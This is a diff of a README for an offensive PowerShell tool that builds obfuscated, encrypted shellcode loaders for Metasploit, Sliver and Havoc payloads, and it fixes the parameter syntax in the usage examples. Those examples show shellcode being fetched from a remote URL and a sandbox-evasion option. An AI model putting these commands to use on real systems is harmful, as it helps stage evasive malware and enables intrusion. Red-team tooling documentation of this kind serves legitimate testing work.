@@ -28,16 +28,16 @@ It generates an obfuscated and encrypted shellcode loader PowerShell script that
 2. Examples with a shellcode file stored on a remote web server
 ```
   - Import-Module ./Invoke-PoSH-ShellCodeLoader.ps1
-  - Invoke-PoSH-ShellCodeLoader -Type=MSF -FileUrl https://URL/shellcode -OutFile C:\path\Packed-ShellCodeLoader.ps1 
+  - Invoke-PoSH-ShellCodeLoader -Type MSF -FileUrl https://URL/shellcode -OutFile C:\path\Packed-ShellCodeLoader.ps1 
     --- or ---
-  - Invoke-PoSH-ShellCodeLoader -Type=Sliver -FileUrl https://URL/shellcode -OutFile C:\path\Packed-ShellCodeLoader.ps1 
+  - Invoke-PoSH-ShellCodeLoader -Type Sliver -FileUrl https://URL/shellcode -OutFile C:\path\Packed-ShellCodeLoader.ps1 
     --- or ---
-  - Invoke-PoSH-ShellCodeLoader -Type=Havoc -FileUrl https://URL/shellcode -OutFile C:\path\Packed-ShellCodeLoader.ps1 
+  - Invoke-PoSH-ShellCodeLoader -Type Havoc -FileUrl https://URL/shellcode -OutFile C:\path\Packed-ShellCodeLoader.ps1 
 ```
 3. Examples with the optional parameter '-Sandbox'
 ```
   - Invoke-PoSH-ShellCodeLoader -Type MSF -FilePath C:\path\shellcode -OutFile C:\path\Packed-ShellCodeLoader.ps1 -Sandbox
-  - Invoke-PoSH-ShellCodeLoader -Type=Sliver -FileUrl https://URL/shellcode -OutFile C:\path\Packed-ShellCodeLoader.ps1  -Sandbox
+  - Invoke-PoSH-ShellCodeLoader -Type Sliver -FileUrl https://URL/shellcode -OutFile C:\path\Packed-ShellCodeLoader.ps1  -Sandbox
 ```
 
 #### INPUT (Shellcode formats)  
